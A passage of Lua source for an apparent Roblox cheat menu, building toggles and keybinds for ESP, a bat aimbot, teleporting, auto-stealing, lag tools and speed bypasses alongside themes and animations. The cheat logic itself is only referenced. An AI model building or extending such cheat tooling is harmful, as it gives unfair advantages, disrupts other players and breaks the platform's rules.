    local _, setATP = uiToggleRow(PMech, "Auto TP Down", M.autoTPEnabled, function(on)
        M.autoTPEnabled = on
        if on then M.startAutoTP() else M.stopAutoTP() end
    end)
    M.setAutoTPVisual = setATP

        -- Mirror TP Down removed

    local _, setPerfectHit = uiToggleRow(PMech, "Perfect Hit", M.perfectHitEnabled ~= false, function(on)
        if M.setPerfectHit then M.setPerfectHit(on) else
            M.perfectHitEnabled = on
            M.tpBatSureHitEnabled = on
            M.tpBatHitMode = on and "Sure" or "Normal"
        end
        saveCherryConfig()
    end)
    M.setPerfectHitVisual = setPerfectHit

    local _, tpHBox = uiNumberRow(PMech, "TP Height", M.autoTPHeight, 1, 100, function(v) M.autoTPHeight = v end)
    M.autoTPHeightBox = tpHBox

    -- PAGE: VISUALS
    uiSectionHeader(PVis, "SKY & VISION")
    -- Clean Sky default ON
    M.cleanSkyEnabled = true
    pcall(function() M.applyCleanSky(true) end)
    local _, setOptimizer = uiToggleRow(PVis, "Optimizer (Nuke + Mid Sun)", M.optimizerEnabled == true, function(on)
        M.applyOptimizer(on)
        saveCherryConfig()
    end)
    M.setOptimizerVisual = setOptimizer

    local _, setPotato = uiToggleRow(PVis, "Potato Graphics", M.potatoGraphicsEnabled == true, function(on)
        if on then
            M.enablePotatoGraphics()
        else
            M.disablePotatoGraphics()
        end
        saveCherryConfig()
    end)
    M.setPotatoVisual = setPotato

    -- Sky selector (Blue Sky / Xim Sky / ... cycle with < >)
    do
        local skyIdx = 1
        for i, t in ipairs(M.SkyOrder) do
            if t == M.currentSkyTheme then skyIdx = i break end
        end
        local _, setSkyUI = uiChoiceRow(PVis, "Sky Theme", M.SkyOrder, skyIdx, function(v)
            M.currentSkyTheme = v
            M.cleanSkyEnabled = false
            pcall(function() M.applyCleanSky(false) end)
            pcall(function() M.CandyApplyCustomSky(v) end)
            saveCherryConfig()
        end)
        M.setSkyThemeVisual = setSkyUI
    end

    -- FOV presets: 70 / 80 / 90 / 100 / 120 / 150 / 180
    do
        local labels = {}
        for _, v in ipairs(M.fovOptions) do table.insert(labels, tostring(v)) end
        local fovIdx = 1
        for i, v in ipairs(M.fovOptions) do
            if v == M.fovValue then fovIdx = i break end
        end
        local _, setFovUI = uiChoiceRow(PVis, "FOV", labels, fovIdx, function(v)
            local n = tonumber(v) or 90
            M.fovValue = n
            for i, x in ipairs(M.fovOptions) do if x == n then M.fovIndex = i break end end
            M.applyFOV()
            saveCherryConfig()
        end)
        M.setFovVisual = setFovUI
    end

    uiSectionHeader(PM, "XIM COLORWAY")
    do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, 44)
        row.BackgroundTransparency = 1
        row.Parent = PM
        local lay = Instance.new("UIListLayout")
        lay.FillDirection = Enum.FillDirection.Horizontal
        lay.Padding = UDim.new(0, 8)
        lay.HorizontalAlignment = Enum.HorizontalAlignment.Left
        lay.VerticalAlignment = Enum.VerticalAlignment.Center
        lay.Parent = row

        local function makeCW(name, label, col)
            local b = Instance.new("TextButton")
            b.Size = UDim2.new(0, 120, 0, 34)
            b.BackgroundColor3 = col
            b.Text = label
            b.TextColor3 = Color3.fromRGB(255, 255, 255)
            b.Font = Enum.Font.GothamBlack
            b.TextSize = 12
            b.AutoButtonColor = false
            b.Parent = row
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
            local st = Instance.new("UIStroke")
            st.Color = Color3.fromRGB(255, 255, 255)
            st.Transparency = 0.55
            st.Thickness = 1
            st.Parent = b
            b.MouseButton1Click:Connect(function()
                M._savedTheme = name
                M.colorScheme = name
                CherryConfig.Theme = name
                applyAccentFromTheme()
                pcall(function()
                    if M.mainFrame then
                        M.mainFrame.BackgroundColor3 = UI_SHELL or UI_BG_DARK
                        M.mainFrame.BackgroundTransparency = UI_SHELL_TRANS or 0.18
                        local ms = M.mainFrame:FindFirstChild("MainStroke")
                        if ms then ms.Color = UI_STROKE or UI_ACCENT end
                        local ov = M.mainFrame:FindFirstChild("CoachOverlay")
                        if ov then
                            ov.BackgroundTransparency = 1 -- never cover bg image
                        end
                        -- restore menu background image after theme (do not leave solid black)
                        if M.applyCustomBackground then M.applyCustomBackground(M.mainFrame) end
                    end
                    if M.recolorBlacksToTheme and M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end
                    if M.applyChromeTheme then M.applyChromeTheme() end
                    if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end
                    if M.refreshVynxBrandColors then M.refreshVynxBrandColors() end
                    if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
                    if M.updateHeadTheme then M.updateHeadTheme() end
                    if M.mobileButtonsEnabled and M.buildMobileButtons then M.buildMobileButtons() end
                    if player.Character then pcall(function() M.attachVynxBellyTag(player.Character); M.attachVynxPantsTag(player.Character); M.attachVynxHat(player.Character) end) end
                    -- rebuild bypass/ping chrome colors if open
                    -- Xim Bypass panel removed
                end)
                saveCherryConfig()
            end)
            return b
        end
        makeCW("Black White", "BLACK WHITE", Color3.fromRGB(255, 255, 255))
        makeCW("Grey", "GREY", Color3.fromRGB(180, 180, 180))
    end

    uiSectionHeader(PVis, "COLOUR THEMES")
    do
        local themeNames = {}
        local hide = {["Black White"]=true,["Light Purple"]=true,["Purple Vynx"]=true,["Red Vynx"]=true,Default=true}
        for name in pairs(CHERRY_THEMES) do
            if not hide[name] then table.insert(themeNames, name) end
        end
        table.sort(themeNames)
        local cur = CherryConfig.Theme or M.colorScheme or "Purple"
        local idx = 1
        for i,n in ipairs(themeNames) do if n == cur then idx = i break end end

        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PVis; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.4,0,1,0)
        l.BackgroundTransparency=1; l.Text="Theme"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13
        l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local themeLbl = Instance.new("TextLabel"); themeLbl.Position=UDim2.new(0.4,0,0,0); themeLbl.Size=UDim2.new(0.6,-10,1,0)
        themeLbl.BackgroundTransparency=1; themeLbl.Text=cur; themeLbl.TextColor3=UI_ACCENT
        themeLbl.Font=Enum.Font.GothamBold; themeLbl.TextSize=12; themeLbl.TextXAlignment=Enum.TextXAlignment.Right; themeLbl.Parent=r

        local sw = Instance.new("Frame"); sw.Size=UDim2.new(1,0,0,36); sw.BackgroundTransparency=1; sw.Parent=PVis
        local swLay = Instance.new("UIListLayout"); swLay.FillDirection=Enum.FillDirection.Horizontal
        swLay.Padding=UDim.new(0,6); swLay.VerticalAlignment=Enum.VerticalAlignment.Center; swLay.Parent=sw

        local function applyTheme(name)
            local t = CHERRY_THEMES[name]; if not t then return end
            CherryConfig.Theme = name
            M.colorScheme = name
            M._savedTheme = name
            applyAccentFromTheme()
            -- bg image stays untinted (no theme color on background)
            themeLbl.Text = name
            themeLbl.TextColor3 = t.Accent
            if M.mainFrame then
                M.mainFrame.BackgroundColor3 = UI_BG_DARK
                local st = M.mainFrame:FindFirstChild("MainStroke")
                if st then st.Color = t.Accent end
                M.applyCustomBackground(M.mainFrame)
            end
            pcall(function()
                if M.applyStealBarTheme then M.applyStealBarTheme(t.Accent) end
                if M.updateHeadTheme then M.updateHeadTheme() end
                -- Mobile buttons follow chosen UI colour + image tint
                if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end
            end)
            saveCherryConfig()
        end

        for _, name in ipairs(themeNames) do
            local t = CHERRY_THEMES[name]
            local b = Instance.new("TextButton")
            b.Size = UDim2.new(0, 28, 0, 16)
            b.BackgroundColor3 = t.Accent
            b.Text = ""
            b.AutoButtonColor = false
            b.Parent = sw
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
            local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(255,255,255); st.Transparency = 0.4; st.Parent = b
            b.MouseButton1Click:Connect(function() applyTheme(name) end)
        end
        local btn = Instance.new("TextButton", r); btn.Size=UDim2.new(1,0,1,0); btn.BackgroundTransparency=1; btn.Text=""
        btn.Activated:Connect(function()
            idx = idx % #themeNames + 1
            applyTheme(themeNames[idx])
        end)
        -- apply current tint to bg image on build
        pcall(function()
            local t = CHERRY_THEMES[cur]
            -- background image not tinted by theme
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
        end)
    end

    uiSectionHeader(PVis, "BACKGROUND")
    do
        local wrap = Instance.new("Frame")
        wrap.Size = UDim2.new(1, 0, 0, 78)
        wrap.BackgroundTransparency = 1
        wrap.Parent = PVis
        local lay = Instance.new("UIListLayout")
        lay.FillDirection = Enum.FillDirection.Horizontal
        lay.Padding = UDim.new(0, 8)
        lay.HorizontalAlignment = Enum.HorizontalAlignment.Center
        lay.VerticalAlignment = Enum.VerticalAlignment.Center
        lay.Parent = wrap
        local function selectBg(id)
            M.customBgId = tonumber(id) or 90631990302263
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
            pcall(saveCherryConfig)
            for _, child in ipairs(wrap:GetChildren()) do
                if child:IsA("ImageButton") then
                    local st = child:FindFirstChildOfClass("UIStroke")
                    if st then
                        local on = tostring(child:GetAttribute("BgId")) == tostring(M.customBgId)
                        st.Color = on and (UI_ACCENT or Color3.fromRGB(255,255,255)) or Color3.fromRGB(50,50,55)
                        st.Thickness = on and 2 or 1
                    end
                end
            end
        end
        for _, id in ipairs(M.BG_IMAGE_IDS or {}) do
            local b = Instance.new("ImageButton")
            b.Size = UDim2.new(0, 96, 0, 64)
            b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            b.BorderSizePixel = 0
            b.Image = "rbxassetid://" .. tostring(id)
            b.ScaleType = Enum.ScaleType.Crop
            b.AutoButtonColor = false
            b:SetAttribute("BgId", id)
            b.Parent = wrap
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 14)
            local st = Instance.new("UIStroke")
            local on = tonumber(M.customBgId) == tonumber(id)
            st.Color = on and (UI_ACCENT or Color3.fromRGB(255,255,255)) or Color3.fromRGB(50,50,55)
            st.Thickness = on and 2 or 1
            st.Parent = b
            b.MouseButton1Click:Connect(function() selectBg(id) end)
        end
        M._selectMenuBackground = selectBg
    end

    uiSectionHeader(PVis, "ESP")
    local _, setEnemyAvatar = uiToggleRow(PVis, "Enemy Avatars", M.playerESPEnabled ~= false, function(on)
        if M.toggleESP then M.toggleESP(on) end
        saveCherryConfig()
    end)
    M.setEnemyAvatarVisual = setEnemyAvatar
    local _, setLineESP = uiToggleRow(PVis, "Line ESP", M.lineESPEnabled, function(on)
        M.lineESPEnabled = on; cherryESPState.LineESP = on
        saveCherryConfig()
    end)
    -- Highlight ESP removed
    cherryESPState.HighlightESP = false
    M.highlightESPEnabled = false
    local _, setSpeedESP = uiToggleRow(PVis, "Speed ESP", M.speedESPEnabled, function(on)
        M.speedESPEnabled = on; cherryESPState.SpeedESP = on
        saveCherryConfig()
    end)

    -- PAGE: UTILITY
    uiSectionHeader(PUtil, "MISC")
    M.antiLagEnabled = true
    pcall(function() M.enableAntiLag() end)

    local _, setNuke = uiToggleRow(PUtil, "Nuke Optimizer", M.nukeOptEnabled == true, function(on)
        M.nukeOptEnabled = on == true
        if on then
            if M.enableNukeOptimizer then M.enableNukeOptimizer() end
        else
            if M.disableNukeOptimizer then M.disableNukeOptimizer() end
        end
        pcall(saveCherryConfig)
    end)
    M.setNukeOptimizerVisual = setNuke

    local _, setFpsBoost = uiToggleRow(PUtil, "FPS Boost", M.fpsBoostEnabled == true, function(on)
        M.setFpsBoost(on)
    end)
    M.setFpsBoostVisual = setFpsBoost

    -- Anti Summer Base removed
    M.antiSummerBaseEnabled = false
    pcall(function() if M.disableAntiSummerBase then M.disableAntiSummerBase() end end)

    local _, setStretch = uiToggleRow(PUtil, "Wide View", M.stretchRezEnabled, function(on)
        M.stretchRezEnabled = on
        if on then M.enableStretchRez() else M.disableStretchRez() end
        saveCherryConfig()
    end)
    M.setStretchRezVisual = setStretch

    local _, setRemoveAcc = uiToggleRow(PUtil, "Remove Accessories", M.removeAccEnabled, function(on)
        M.removeAccEnabled = on
        if on then M.startRemoveAcc() else M.stopRemoveAcc() end
    end)

    -- Anti-Kick removed
    M.antiKickEnabled = false
    pcall(function() if M.disableAntiKick then M.disableAntiKick() end end)

    local _, setSafeMode = uiToggleRow(PUtil, "Safe Mode", M.safeModeEnabled, function(on)
        M.safeModeEnabled = on
        if on then M.enableSafeMode() else M.disableSafeMode() end
        saveCherryConfig()
    end)
    M.setSafeModeVisual = setSafeMode


    -- Custom Font removed

    -- Intro Song removed (always off)
    local _, setIntroGUI = uiToggleRow(PUtil, "Intro GUI", M.introGUIEnabled, function(on)
        M.introGUIEnabled = on
    end)

    local _, setMobBtns = uiToggleRow(PUtil, "Mobile Buttons", M.mobileButtonsEnabled, function(on)
        M.mobileButtonsEnabled = on
        if on then M.buildMobileButtons() else M.destroyMobileButtons() end
        saveCherryConfig()
    end)

    local _, setCircleBtns = uiToggleRow(PUtil, "Circle Buttons", M.circleButtonsEnabled, function(on)
        M.circleButtonsEnabled = on
        if M.mobileButtonsEnabled then M.buildMobileButtons() end
        saveCherryConfig()
    end)
    M.setCircleBtnsVisual = setCircleBtns

    local _, setLockMob = uiToggleRow(PUtil, "Lock Mobile Buttons", M.mobileButtonsLocked == true, function(on)
        M.mobileButtonsLocked = on and true or false
        saveCherryConfig()
    end)
    M.setLockMobVisual = setLockMob

    local _, btnSzBox = uiNumberRow(PUtil, "Button Size", M.mobileButtonsSize, 40, 150, function(v)
        M.mobileButtonsSize = v
        if M.mobileButtonsEnabled then M.buildMobileButtons() end
    end)

    local _, menuScaleBox = uiNumberRow(PUtil, "Menu Scale", 0.48, 0.35, 1.2, function(v)
        M.uiScale = math.clamp(v, 0.35, 1.2)
        if M.uiScaleRef then M.uiScaleRef.Scale = M.uiScale end
        saveCherryConfig()
    end)

    uiActionRow(PUtil, "Reset Mobile Positions", function() M.resetMobilePositions() end)

    local _, setAntiDie = uiToggleRow(PUtil, "Anti Die", M.antiDieEnabled == true, function(on)
        if on then M.startAntiDie() else M.stopAntiDie() end
        M.antiDieEnabled = on == true
        saveCherryConfig()
    end)
    M.setAntiDieVisual = setAntiDie

    uiSectionHeader(PAnim, "ANIMATION")
    local _, setUnwalk = uiToggleRow(PAnim, "Unwalk", M.unwalkEnabled == true, function(on)
        if on then
            -- Unwalk ON: turn off anim packs → unwalk walk/run
            M.animPackEnabled = false
            M.animPack = nil
            if M.setVampireAnimVisual then M.setVampireAnimVisual(false) end
            if M.setAmazonAnimVisual then M.setAmazonAnimVisual(false) end
            if M.setGirlAnimVisual then M.setGirlAnimVisual(false) end
            if M.setTryhardAnimVisual then M.setTryhardAnimVisual(false) end
            M.unwalkEnabled = true
            M.startUnwalk()
        else
            -- Unwalk OFF → normal game animations (unless a pack is on)
            M.unwalkEnabled = false
            M.stopUnwalk()
        end
        saveCherryConfig()
    end)
    M.setUnwalkVisual = setUnwalk

    local function setAnimToggle(packName, on)
        local ALLOWED = { Vampire = true, ["Amazon Unboxed"] = true, Bubbly = true, Tryhard = true }
        if not ALLOWED[packName] then return end
        if on then
            -- pack ON: unwalk off
            M.unwalkEnabled = false
            if M.setUnwalkVisual then pcall(function() M.setUnwalkVisual(false) end) end
            M.animPackEnabled = true
            M.animPack = packName
            M.applyAnimPack(packName)
            if M.setVampireAnimVisual then M.setVampireAnimVisual(packName == "Vampire") end
            if M.setAmazonAnimVisual then M.setAmazonAnimVisual(packName == "Amazon Unboxed") end
            if M.setGirlAnimVisual then M.setGirlAnimVisual(packName == "Bubbly") end
            if M.setTryhardAnimVisual then M.setTryhardAnimVisual(packName == "Tryhard") end
        else
            -- pack OFF → if unwalk on keep unwalk, else normal base animations
            if M.animPack == packName then
                M.animPackEnabled = false
                M.animPack = nil
                local ch = player.Character
                if M.unwalkEnabled then
                    pcall(function() M.startUnwalk() end)
                elseif ch and M.resetAnimations then
                    pcall(M.resetAnimations, ch)
                end
                if M.setVampireAnimVisual then M.setVampireAnimVisual(false) end
                if M.setAmazonAnimVisual then M.setAmazonAnimVisual(false) end
                if M.setGirlAnimVisual then M.setGirlAnimVisual(false) end
                if M.setTryhardAnimVisual then M.setTryhardAnimVisual(false) end
            end
        end
        saveCherryConfig()
    end

    local _, setVampireAnim = uiToggleRow(PAnim, "Vampire Animation",
        M.animPackEnabled and M.animPack == "Vampire",
        function(on) setAnimToggle("Vampire", on) end)
    M.setVampireAnimVisual = setVampireAnim

    local _, setAmazonAnim = uiToggleRow(PAnim, "Amazon Unboxed",
        M.animPackEnabled and M.animPack == "Amazon Unboxed",
        function(on) setAnimToggle("Amazon Unboxed", on) end)
    M.setAmazonAnimVisual = setAmazonAnim

    local _, setGirlAnim = uiToggleRow(PAnim, "Girl Animation (Bubbly)",
        M.animPackEnabled and M.animPack == "Bubbly",
        function(on) setAnimToggle("Bubbly", on) end)
    M.setGirlAnimVisual = setGirlAnim

    local _, setTryhardAnim = uiToggleRow(PAnim, "Tryhard Animation",
        M.animPackEnabled and M.animPack == "Tryhard",
        function(on) setAnimToggle("Tryhard", on) end)
    M.setTryhardAnimVisual = setTryhardAnim

    M.vyncSkinEnabled = false
    pcall(function() if M.clearVyncSkin and player.Character then M.clearVyncSkin(player.Character) end end)
    M.setVyncSkinVisual = nil

    M.headlessEnabled = false
    M.korbloxEnabled = false
    M.vynxBlackSkinEnabled = false
    if player.Character then
        pcall(function() M.applyCharterToChar(player.Character) end)
    end

    uiSectionHeader(PUtil, "PANELS")
    -- Panel Background ID removed (dots-only panels)

    local _, setPingPanel = uiToggleRow(PUtil, "Ping Lagger Panel", M.pingPanelOpen == true, function(on)
        if M.setPingPanelOpen then M.setPingPanelOpen(on) end
        pcall(saveCherryConfig)
    end)
    M.setPingPanelVisual = setPingPanel
    local _, setLaggerPanel = uiToggleRow(PUtil, "Lagger Panel", M.killLaggerOpen == true, function(on)
        if M.setKillLaggerPanelOpen then M.setKillLaggerPanelOpen(on) end
        pcall(saveCherryConfig)
    end)
    M.setKillLaggerPanelVisual = setLaggerPanel
    -- Anti Anti Desync panel removed
    M.aadPanelOpen = false
    M.setAadPanelVisual = nil
    pcall(function()
        if M.setAntiAntiDesync then M.setAntiAntiDesync(false) end
        if M.aadGui then M.aadGui:Destroy() end
        M.aadGui = nil; M.aadMain = nil
    end)
    uiActionRow(PUtil, "Reset Panel Positions", function()
        M.resetPanelPositions()
    end)
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Save Config"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local sBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="SAVE", Col=Color3.fromRGB(40, 40, 40), TS=12, CR=6, SC=Color3.fromRGB(0, 0, 0), STr=0.2})
        sBtn.Activated:Connect(function()
            saveCherryConfig()
            sBtn.Text = "OK"
            task.delay(0.8, function() if sBtn and sBtn.Parent then sBtn.Text = "SAVE" end end)
        end)
    end
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Reset All Settings"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local rBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="RESET", Col=Color3.fromRGB(40, 40, 40), TS=12, CR=6, SC=Color3.fromRGB(0, 0, 0), STr=0.2})
        rBtn.Activated:Connect(function() M.resetAllSettings() end)
    end

    -- PAGE: KEYBINDS
    uiSectionHeader(PKB, "KEYBINDS")
    uiKeybindRow(PKB, "Hide GUI", M.KB.GuiHide, "GuiHide")
    uiKeybindRow(PKB, "Normal [Speed Custom]", M.KB.SpeedToggle, "SpeedToggle")
    uiKeybindRow(PKB, "Lagger Toggle [Speed Custom]", M.KB.LaggerToggle, "LaggerToggle")
    uiKeybindRow(PKB, "Bat Aimbot", M.KB.AutoBat, "AutoBat")
    uiKeybindRow(PKB, "TP Bat", M.KB.BypassAimbot, "BypassAimbot")
    uiKeybindRow(PKB, "Auto Left", M.KB.AutoLeft, "AutoLeft")
    uiKeybindRow(PKB, "Auto Right", M.KB.AutoRight, "AutoRight")
    uiKeybindRow(PKB, "Drop Brainrot", M.KB.DropBrainrot, "DropBrainrot")
    uiKeybindRow(PKB, "TP Down", M.KB.TPFloor, "TPFloor")
    uiKeybindRow(PKB, "Ping Lagger", M.KB.PingLagger, "PingLagger")
    uiKeybindRow(PKB, "Insta Reset", M.KB.InstaReset, "InstaReset")

    -- Restore menu open/closed from config
    do
        local open = M.menuOpen ~= false
        Frame.Visible = open
        MinPill.Visible = not open
        M.menuOpen = open
    end

    -- APPLY INITIAL STATES
    M.applyStealBarTheme(CHERRY_ACCENT)
    M.updateHeadTheme()
    pcall(function() if M.applyChromeTheme then M.applyChromeTheme() end end)
    M.applyFOV()

    task.spawn(function()
        local last = tick()
        local frames = 0
        local fps = 60
        RunService.RenderStepped:Connect(function()
            frames = frames + 1
            local now = tick()
            if now - last >= 0.5 then
                fps = math.floor(frames / (now - last) + 0.5)
                frames = 0
                last = now
                if M.headerStatsLbl then
                    local ping = 0
                    pcall(function()
                        ping = math.floor(player:GetNetworkPing() * 1000 + 0.5)
                    end)
                    M.headerStatsLbl.Text = string.format("FPS: %d  |  MS: %d", fps, ping)
                end
                if M.headerFpsLbl then
                    M.headerFpsLbl.Text = string.format("FPS: %d", fps)
                end
                if M.headerMsLbl then
                    local ping = 0
                    pcall(function()
                        ping = math.floor(player:GetNetworkPing() * 1000 + 0.5)
                    end)
                    M.headerMsLbl.Text = string.format("MS: %d", ping)
                end
                if M.headerRadiusLbl and M.getActiveStealRadius then
                    M.headerRadiusLbl.Text = tostring(M.getActiveStealRadius())
                end
            end
        end)
    end)

    M.autoTPHeightBox = tpHBox
    M.radInput = srBox
    M.durationBox = sdBox
    M.btnSzBox = btnSzBox
    M.sbBox = sbBox

    if M.setAntiRagVisual then M.setAntiRagVisual(M.antiRagdollEnabled) end
    if M.setSafeModeVisual then M.setSafeModeVisual(M.safeModeEnabled) end
    if M.setAutoCarryVisual then M.setAutoCarryVisual(M.autoSwitchSpeedEnabled) end
    if M.setCircleBtnsVisual then M.setCircleBtnsVisual(M.circleButtonsEnabled) end
    if M.safeModeEnabled then M.enableSafeMode() end
    M.antiKickEnabled = false

    if M.setAntiRagModeUI then M.setAntiRagModeUI(M.antiRagdollMode == "No Splatter" and "No Splatter" or "Splatter") end
    if M.setInfJumpVisual then M.setInfJumpVisual(M.infJumpEnabled) end
    if M.setMedusaVisual then M.setMedusaVisual(M.medusaCounterEnabled) end
    if M.setBatCounterVisual then M.setBatCounterVisual(M.batCounterEnabled) end
    if M.setAntiLagVisual then M.setAntiLagVisual(M.antiLagEnabled) end
    if M.setStretchRezVisual then M.setStretchRezVisual(M.stretchRezEnabled) end
    if M.setPotatoVisual then M.setPotatoVisual(M.potatoGraphicsEnabled) end
    if M.setAutoTPVisual then M.setAutoTPVisual(M.autoTPEnabled) end
    if M.setInstaGrab then M.setInstaGrab(M.Steal.AutoStealEnabled) end
    if M.setAutoRadiusVisual then M.setAutoRadiusVisual(M.autoRadiusEnabled) end
    if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
    if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
    if M.setAutoSwingVisual then M.setAutoSwingVisual(M.autoSwingEnabled) end
    if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
    -- skin cosmetics stay as loaded from config (default original avatar)
    if player.Character then pcall(function() M.applyCharterToChar(player.Character) end) end
    if M.setStealModeUI then
        local lab = (M.stealMode == "Semi") and "Semi" or "V2"
        M.setStealModeUI(lab)
    end
    if M.setJumpModeUI then M.setJumpModeUI(M.infJumpMode == "hold" and "Hold" or "Manual") end
    if M.setTpBatModeUI then M.setTpBatModeUI(M.tpBatHitMode == "Normal" and "Normal Hit" or "Sure Hit") end
    if M.setVampireAnimVisual then M.setVampireAnimVisual(M.animPackEnabled and M.animPack == "Vampire") end
    if M.setAmazonAnimVisual then M.setAmazonAnimVisual(M.animPackEnabled and M.animPack == "Amazon Unboxed") end
    if M.setGirlAnimVisual then M.setGirlAnimVisual(M.animPackEnabled and M.animPack == "Bubbly") end
    if M.setTryhardAnimVisual then M.setTryhardAnimVisual(M.animPackEnabled and M.animPack == "Tryhard") end
    if M.setUnwalkVisual then M.setUnwalkVisual(M.unwalkEnabled == true) end
    -- Do not force unwalk; applyWalkState respects toggles (both off = original)
    task.defer(function()
        pcall(function() M.applyWalkState(player.Character) end)
    end)


    cherryESPState.LineESP = M.lineESPEnabled
    cherryESPState.SpeedESP = M.speedESPEnabled
    cherryESPState.HighlightESP = M.highlightESPEnabled == true

    M.updateStatusRadius()
    M.startHeadSpeedUpdates()
    M._buildingGui = false
end

function M.applyStealBarTheme(accentColor)
    -- progress fill always pure white while stealing
    local red = Color3.fromRGB(255, 255, 255)
    if M.statusFill then
        M.statusFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        local grad = M.statusFill:FindFirstChild("FillColorGrad")
        if grad and grad:IsA("UIGradient") then
            grad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(240, 240, 240)),
            })
        end
    end
    if M.statusMain then
        M.statusMain.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        M.statusMain.BackgroundTransparency = 0.08
    end
    if M.statusBgImg then
        M.statusBgImg.Visible = false
    end
end


function M.resetAllSettings()
    M.NS = 60
    M.CS = 30
    M.LAGGER_SPEED = 22
    M.LAGGER_CARRY_SPEED = 22
    M.BYPASS_SPEED = 40
    M.BYPASS_CARRY_SPEED = 22
    M.speedMethod = "Velocity"
    M.hyperMult = 4
    M._lastSpeedMethod = nil
    M._anchoredBySpeed = nil
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    M.antiRagdollEnabled = false
M.hardHitEnabled = false
M.hardHitRadius = 10
    M.antiRagdollMode = "Splatter"
    M.infJumpEnabled = false
    M.infJumpMode = "manual"
    M.medusaCounterEnabled = false
    M.batCounterEnabled = false
    M.unwalkEnabled = false
    M.medusaResetEnabled = false
    M.medusaDebounce = false
    M.medusaLastUsed = 0
    M.autoLeftEnabled = false
    M.autoRightEnabled = false
    M.autoBatEnabled = false
    M.autoSwingEnabled = true
    M.autoMoveSwingEnabled = false
    M.antiLagEnabled = true
    M.removeAccessoriesEnabled = false
    M.stretchRezEnabled = false
    M.autoTPEnabled = false
    M.autoTPHeight = 20
    M.guiTransparencyEnabled = false
    M.mobileButtonsEnabled = true
    M.mobileButtonsSize = 60
    M.circleButtonsEnabled = false
    M.fovValue = 80
    M.fovIndex = 1
    M.autoSwitchSpeedEnabled = false
    M.antiKickEnabled = false
    M.brainrotDetected = false
    M.ragdollGuiEnabled = true
    M.introSoundEnabled = false
    M.introSongChoice = 3
    M.introGUIEnabled = true
    M.Steal.AutoStealEnabled = false
    M.autoRadiusEnabled = false
    M.Steal.StealRadius = 60
    M.Steal.StealDuration = 1.4
    M.Steal.StopTime = 0.35
    M.stealMode = "V2"
    M.Semi.holdMin = 1.3
    M.Semi.holdMax = 2.6
    M.Semi.entryDelay = 0.3
    M.Semi.radius = 10
    M.Semi.primeRange = 80
    M.removeAccEnabled = false
    M.playerESPEnabled = false
    M.showPlayerSpeeds = false
    M.uiScale = 0.48
    M.perButtonDragEnabled = true
    M.stealBarSize = 300
    M.lineESPEnabled = false
    M.speedESPEnabled = false
    M.autoResetOnDeath = false
    M.animPack = nil
    M.headlessEnabled = false
    M.korbloxEnabled = false
    M.vynxBlackSkinEnabled = false
    M.bypassAimbotEnabled = false
    M.animPackEnabled = false
    M.unwalkEnabled = false
    M.antiLagEnabled = true -- Nuke always on

